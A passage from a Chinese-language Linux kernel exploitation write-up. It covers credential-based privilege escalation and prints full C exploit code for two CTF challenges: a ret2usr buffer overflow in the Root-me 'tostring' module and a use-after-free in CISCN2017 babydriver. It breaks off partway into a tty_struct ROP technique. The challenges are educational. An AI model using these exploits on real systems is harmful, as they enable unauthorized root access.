+<p>iretq中q后缀，是quadra word的意思，也就是说64位指令。还存在iretd, iretw等。</p>
+</blockquote>
+<h3 id=内核态函数3>内核态函数[3]</h3>
+<p>相比用户态库函数，内核态的函数有了一些变化</p>
+<ul>
+<li>printf() -> printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
+<li>memcpy() -> copy_from_user()/copy_to_user()
+copy_from_user() 实现了将用户空间的数据传送到内核空间
+copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
+<li>malloc() -> kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
+<li>free() -> kfree()，同 kmalloc()</li>
+</ul>
+<p><strong>提权函数</strong></p>
+<p>kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：</p>
+<ul>
+<li><code>int commit_creds(struct cred *new)</code></li>
+<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li>
+</ul>
+<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p>
+<p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。通常需要root权限查看。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ sudo grep commit_creds /proc/kallsyms
+</code></pre></td></tr></table>
+</div>
+</div><p><code>struct cred</code> 每个进程都有这么个结构，如果能修改，也就获得了对应权限。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>struct</span> <span class=n>cred</span> <span class=p>{</span>
+	<span class=n>atomic_t</span>	<span class=n>usage</span><span class=p>;</span>
+<span class=cp>#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span class=cp></span>	<span class=n>atomic_t</span>	<span class=n>subscribers</span><span class=p>;</span>	<span class=cm>/* number of processes subscribed */</span>
+	<span class=kt>void</span>		<span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
+	<span class=kt>unsigned</span>	<span class=n>magic</span><span class=p>;</span>
+<span class=cp>#define CRED_MAGIC	0x43736564
+</span><span class=cp>#define CRED_MAGIC_DEAD	0x44656144
+</span><span class=cp>#endif
+</span><span class=cp></span>	<span class=n>kuid_t</span>		<span class=n>uid</span><span class=p>;</span>		<span class=cm>/* real UID of the task */</span>
+	<span class=n>kgid_t</span>		<span class=n>gid</span><span class=p>;</span>		<span class=cm>/* real GID of the task */</span>
+	<span class=n>kuid_t</span>		<span class=n>suid</span><span class=p>;</span>		<span class=cm>/* saved UID of the task */</span>
+	<span class=n>kgid_t</span>		<span class=n>sgid</span><span class=p>;</span>		<span class=cm>/* saved GID of the task */</span>
+	<span class=n>kuid_t</span>		<span class=n>euid</span><span class=p>;</span>		<span class=cm>/* effective UID of the task */</span>
+	<span class=n>kgid_t</span>		<span class=n>egid</span><span class=p>;</span>		<span class=cm>/* effective GID of the task */</span>
+	<span class=n>kuid_t</span>		<span class=n>fsuid</span><span class=p>;</span>		<span class=cm>/* UID for VFS ops */</span>
+	<span class=n>kgid_t</span>		<span class=n>fsgid</span><span class=p>;</span>		<span class=cm>/* GID for VFS ops */</span>
+	<span class=kt>unsigned</span>	<span class=n>securebits</span><span class=p>;</span>	<span class=cm>/* SUID-less security management */</span>
+	<span class=n>kernel_cap_t</span>	<span class=n>cap_inheritable</span><span class=p>;</span> <span class=cm>/* caps our children can inherit */</span>
+	<span class=n>kernel_cap_t</span>	<span class=n>cap_permitted</span><span class=p>;</span>	<span class=cm>/* caps we&#39;re permitted */</span>
+	<span class=n>kernel_cap_t</span>	<span class=n>cap_effective</span><span class=p>;</span>	<span class=cm>/* caps we can actually use */</span>
+	<span class=n>kernel_cap_t</span>	<span class=n>cap_bset</span><span class=p>;</span>	<span class=cm>/* capability bounding set */</span>
+	<span class=n>kernel_cap_t</span>	<span class=n>cap_ambient</span><span class=p>;</span>	<span class=cm>/* Ambient capability set */</span>
+<span class=cp>#ifdef CONFIG_KEYS
+</span><span class=cp></span>	<span class=kt>unsigned</span> <span class=kt>char</span>	<span class=n>jit_keyring</span><span class=p>;</span>	<span class=cm>/* default keyring to attach requested
+</span><span class=cm>					 * keys to */</span>
+	<span class=k>struct</span> <span class=n>key</span> <span class=n>__rcu</span> <span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span> <span class=cm>/* keyring inherited over fork */</span>
+	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this process */</span>
+	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this thread */</span>
+	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span> <span class=cm>/* assumed request_key authority */</span>
+<span class=cp>#endif
+</span><span class=cp>#ifdef CONFIG_SECURITY
+</span><span class=cp></span>	<span class=kt>void</span>		<span class=o>*</span><span class=n>security</span><span class=p>;</span>	<span class=cm>/* subjective LSM security */</span>
+<span class=cp>#endif
+</span><span class=cp></span>	<span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>	<span class=cm>/* real user ID subscription */</span>
+	<span class=k>struct</span> <span class=n>user_namespace</span> <span class=o>*</span><span class=n>user_ns</span><span class=p>;</span> <span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
+	<span class=k>struct</span> <span class=n>group_info</span> <span class=o>*</span><span class=n>group_info</span><span class=p>;</span>	<span class=cm>/* supplementary groups for euid/fsgid */</span>
+	<span class=k>struct</span> <span class=n>rcu_head</span>	<span class=n>rcu</span><span class=p>;</span>		<span class=cm>/* RCU deletion hook */</span>
+<span class=p>}</span> <span class=n>__randomize_layout</span><span class=p>;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=题目>题目</h2>
+<h3 id=ret2usr--rootme-buffer-overflow-basic-1httpswwwroot-meorgenchallengesapp-systemlinkern-x86-buffer-overflow-basic-1>ret2usr | <a href=https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1>Rootme buffer overflow basic 1</a></h3>
+<p>题目有以下几个文件：</p>
+<ul>
+<li>bzImage：内核文件</li>
+<li>ch1.c：模块源代码</li>
+<li>initramfs.img：用cpio打包成的初始文件系统</li>
+<li>passwd.img：flag所在，在qemu中普通用户无法读取</li>
+<li>run：set-uid程序，运行._start_vm启动qemu</li>
+<li>._start_vm：启动脚本</li>
+</ul>
+<p>虚拟机中<code>/init</code>文件，在Linux启动的最后一步将会执行此脚本。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/sh
+</span><span class=cp></span>
+<span class=c1># 挂载 devtmpfs 类型的文件系统，设备名设置为 none，挂载目录为 /dev</span>
+<span class=c1># devtmpfs 的功用是在 Linux 核心启动早期建立一个初步的 /dev，</span>
+<span class=c1># 令一般启动程序不用等待 udev，缩短 GNU/Linux 的开机时间。[4]</span>
+mount -t devtmpfs none /dev
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+ 
+<span class=c1>#</span>
+<span class=c1># flag</span>
+<span class=c1>#</span>
+mkdir -p /passwd
+mount -t ext2 -o ro /dev/sda /passwd
+
+<span class=c1>#</span>
+<span class=c1># share</span>
+<span class=c1>#</span>
+<span class=c1># 挂载与主机共享的文件夹</span>
+mkdir -p /mnt/share
+mount -t 9p -o <span class=nv>trans</span><span class=o>=</span>virtio rootme /mnt/share/ -oversion<span class=o>=</span>9p2000.L,posixacl,sync
+chmod <span class=m>777</span> /mnt/share/
+
+<span class=c1>#</span>
+<span class=c1># module</span>
+<span class=c1>#</span>
+<span class=c1># 安装漏洞模块</span>
+insmod /lib/modules/*/rootme/*.ko
+chmod <span class=m>666</span> /dev/tostring 
+<span class=c1># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span>
+<span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/vm/mmap_min_addr
+
+<span class=c1>#</span>
+<span class=c1># shell</span>
+<span class=c1>#</span>
+cat /etc/issue
+<span class=nb>export</span> <span class=nv>ENV</span><span class=o>=</span>/etc/profile
+setsid cttyhack setuidgid <span class=m>1000</span> sh
+ 
+umount /proc
+umount /sys
+umount /dev
+ 
+poweroff -f
+</code></pre></td></tr></table>
+</div>
+</div><p>在tostring模块中可以发现，tostring结构中<code>tostring_stack</code>存在溢出的可能，在<code>tostring_write</code>中并未作出限制。<code>tostring_stack</code>后面就是一个函数指针。同时该kernel并没有随机化，通过<code>/proc/kallsyms</code>获取<code>prepare_kernel_cred</code>和<code>commit_creds</code>函数的地址。</p>
+<p>调试中可以用条件断点<code>b tostring_write if (int)tostring==64</code>比较方便。</p>
+<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/LinKern_x86-Buffer_overflow_basic_1/exp.c>exp</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
+    <span class=kt>void</span> <span class=o>*</span><span class=n>eip</span><span class=p>;</span>
+    <span class=kt>uint32_t</span> <span class=n>cs</span><span class=p>;</span>
+    <span class=kt>uint32_t</span> <span class=n>eflags</span><span class=p>;</span>
+    <span class=kt>void</span> <span class=o>*</span><span class=n>esp</span><span class=p>;</span>
+    <span class=kt>uint32_t</span> <span class=n>ss</span><span class=p>;</span>
+<span class=p>}</span><span class=n>__attribute__</span><span class=p>((</span><span class=n>packed</span><span class=p>));</span>
+
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
+
+<span class=kt>void</span> <span class=nf>getshell</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>execl</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>init_tf_work</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>asm</span><span class=p>(</span>
+        <span class=s>&#34;pushl %cs;popl tf+4;&#34;</span>
+        <span class=s>&#34;pushfl;popl tf+8;&#34;</span>
+        <span class=s>&#34;pushl %esp;popl tf+12;&#34;</span>
+        <span class=s>&#34;pushl %ss;popl tf+16;&#34;</span>
+    <span class=p>);</span>
+    <span class=n>tf</span><span class=p>.</span><span class=n>eip</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>getshell</span><span class=p>;</span>
+    <span class=n>tf</span><span class=p>.</span><span class=n>esp</span> <span class=o>-=</span> <span class=mi>1024</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=cp>#define KERNCALL __attribute__((regparm(3)))
+</span><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xc10711f0</span><span class=p>;</span>
+<span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xc1070e80</span><span class=p>;</span>
+<span class=kt>void</span> <span class=nf>payload</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>commit_creds</span><span class=p>(</span><span class=n>prepare_kernel_cred</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
+    <span class=k>asm</span><span class=p>(</span>
+        <span class=s>&#34;mov $tf, %esp;&#34;</span>
+        <span class=s>&#34;iret;&#34;</span>
+    <span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=kt>char</span> <span class=n>recv</span><span class=p>[</span><span class=mi>255</span><span class=p>];</span>
+    <span class=kt>char</span> <span class=n>padding</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;AAAAAAAA&#34;</span><span class=p>;</span>
+    <span class=kt>char</span> <span class=n>eip</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
+    <span class=n>init_tf_work</span><span class=p>();</span>
+    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/tostring&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x40</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>padding</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>padding</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=o>*</span><span class=p>((</span><span class=kt>void</span><span class=o>**</span><span class=p>)(</span><span class=n>eip</span><span class=p>))</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>payload</span><span class=p>;</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>eip</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>eip</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>recv</span><span class=p>,</span> <span class=mi>255</span><span class=p>);</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=uaf--rop--ciscn2017-babydriver>UAF & ROP | CISCN2017 babydriver</h3>
+<h4 id=ioctl>ioctl</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>ioctl</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>request</span><span class=p>,</span> <span class=p>...);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第一个参数是文件描述符，第二个是程序对设备的控制指令，后面则是指令的补充参数。</p>
+<p>对于Linux，一切皆文件。而Linux提供的读写文件的函数（read, write, lseek等）对于许多的设备不好进行控制，所以提供了ioctl函数。request就是设备驱动程序提供的控制指令。</p>
+<h4 id=分析>分析</h4>
+<p><code>babydriver_init</code>，<code>babydriver_exit</code>是常规的创建和销毁过程。</p>
+<p><code>babyioctl</code>定义了一个ioctl指令来分配指定大小的buf。</p>
+<p><code>babyopen</code>默认分配一个64字节的buf。<code>kmem_cache_alloc_trace</code>似乎是<code>kmalloc</code>优化的结果，还不了解后续再研究。<a href=https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/slab.h#L458>src</a></p>
+<p><code>babyread</code>/<code>babywrite</code> 从buf读取数据/往buf写入数据，都对大小进行了验证，不存在溢出。</p>
+<p>漏洞点在于该符号设备全局共享一个buf，所以同时打开两次，这两次共享一个buf，释放其中一个就发生了UAF。</p>
+<h4 id=exploit1>exploit1</h4>
+<p>打开两次设备，使用ioctl控制buf为<code>struct cred</code>的大小，然后close其中一次打开，另一次打开就指向了一块已经释放的区域，fork产生的新进程就会分配得到该区块用来存储<code>cred</code>，通过另一次打开的设备进行覆写改变进程uid、gid，就获得了root权限。</p>
+<p>在这里计算<code>struct cred</code>的大小是一个难点，我并未找到很简单的方法来计算。因为这个结构体里面也有许多的结构体，我觉得直接看源码并不那么容易计算。。。一层套一层，还有对齐的问题。先直接用了，后面再找办法[todolist2]&lt;已解决>，大小为0xa8。<a href=https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118>src</a></p>
+<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp1.c>exp</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=n>pid_t</span> <span class=n>pid</span><span class=p>;</span>
+
+    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>);</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
+
+    <span class=k>if</span> <span class=p>((</span><span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>())</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>char</span> <span class=n>zero</span><span class=p>[</span><span class=mi>36</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+        <span class=n>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>zero</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>zero</span><span class=p>));</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>getuid</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+            <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>  <span class=p>{</span>
+        <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Fork failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>fd2</span><span class=p>);</span>
+
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id=exploit2>exploit2</h4>
+<p>思路：利用gadgets关闭SMEP，内核没有开启地址随机，直接<code>commit_creds(prepare_kernel_cred(0))</code>，然后跳转到用户程序getshell。</p>
+<p>这里使用覆写<code>tty_struct</code>的方法来获得程序控制流：</p>
+<p><code>tty_struct</code></p>
+<details>
+<summary>struct tty_struct</summary>
+<p>
+```c
+struct tty_struct {
+int magic;
+struct kref kref;
+struct device *dev;
+struct tty_driver *driver;
+const struct tty_operations *ops; < -- 这里
+int index;
+/* Protects ldisc changes: Lock tty not pty */
+struct ld_semaphore ldisc_sem;
+struct tty_ldisc *ldisc;
+struct mutex atomic_write_lock;
+struct mutex legacy_mutex;
+struct mutex throttle_mutex;
+struct rw_semaphore termios_rwsem;
+struct mutex winsize_mutex;
+spinlock_t ctrl_lock;
+spinlock_t flow_lock;
+/* Termios values are protected by the termios rwsem */
+struct ktermios termios, termios_locked;
+struct termiox *termiox; /* May be NULL for unsupported */
+char name[64];
+struct pid *pgrp; /* Protected by ctrl lock */
+struct pid *session;
+unsigned long flags;
+int count;
+struct winsize winsize; /* winsize_mutex */
+unsigned long stopped:1, /* flow_lock */
+flow_stopped:1,
+unused:BITS_PER_LONG - 2;
+int hw_stopped;
+unsigned long ctrl_status:8, /* ctrl_lock */
+packet:1,
+unused_ctrl:BITS_PER_LONG - 9;
+unsigned int receive_room; /* Bytes free for queue */
+int flow_change;
+struct tty_struct *link;
+struct fasync_struct *fasync;
+wait_queue_head_t write_wait;
+wait_queue_head_t read_wait;
+struct work_struct hangup_work;
+void *disc_data;
+void *driver_data;
+spinlock_t files_lock; /* protects tty_files list */
+struct list_head tty_files;
+#define N_TTY_BUF_SIZE 4096
+int closing;
+unsigned char *write_buf;
+int write_cnt;
+/* If the tty has a pending do_SAK, queue it here - akpm */
+struct work_struct SAK_work;
+struct tty_port *port;
+} __randomize_layout;
+```
+</p>
+</details>
+<p><code>struct tty_operations</code></p>
+<details>
+<summary>struct tty_operations</summary>
+<p>
+```c
+struct tty_operations {
+struct tty_struct * (*lookup)(struct tty_driver *driver,
+struct file *filp, int idx);
+int (*install)(struct tty_driver *driver, struct tty_struct *tty);
+void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+int (*open)(struct tty_struct * tty, struct file * filp);
+void (*close)(struct tty_struct * tty, struct file * filp);
+void (*shutdown)(struct tty_struct *tty);
+void (*cleanup)(struct tty_struct *tty);
+int (*write)(struct tty_struct * tty,
+const unsigned char *buf, int count);
+int (*put_char)(struct tty_struct *tty, unsigned char ch);
+void (*flush_chars)(struct tty_struct *tty);
+int (*write_room)(struct tty_struct *tty);
+int (*chars_in_buffer)(struct tty_struct *tty);
+int (*ioctl)(struct tty_struct *tty,
+unsigned int cmd, unsigned long arg);
+long (*compat_ioctl)(struct tty_struct *tty,
+unsigned int cmd, unsigned long arg);
+void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+void (*throttle)(struct tty_struct * tty);
+void (*unthrottle)(struct tty_struct * tty);
+void (*stop)(struct tty_struct *tty);
+void (*start)(struct tty_struct *tty);
+void (*hangup)(struct tty_struct *tty);
+int (*break_ctl)(struct tty_struct *tty, int state);
+void (*flush_buffer)(struct tty_struct *tty);
+void (*set_ldisc)(struct tty_struct *tty);
+void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+void (*send_xchar)(struct tty_struct *tty, char ch);
+int (*tiocmget)(struct tty_struct *tty);
+int (*tiocmset)(struct tty_struct *tty,
+unsigned int set, unsigned int clear);
+int (*resize)(struct tty_struct *tty, struct winsize *ws);
+int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+int (*get_icount)(struct tty_struct *tty,
+struct serial_icounter_struct *icount);
+void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
+#ifdef CONFIG_CONSOLE_POLL
+int (*poll_init)(struct tty_driver *driver, int line, char *options);
+int (*poll_get_char)(struct tty_driver *driver, int line);
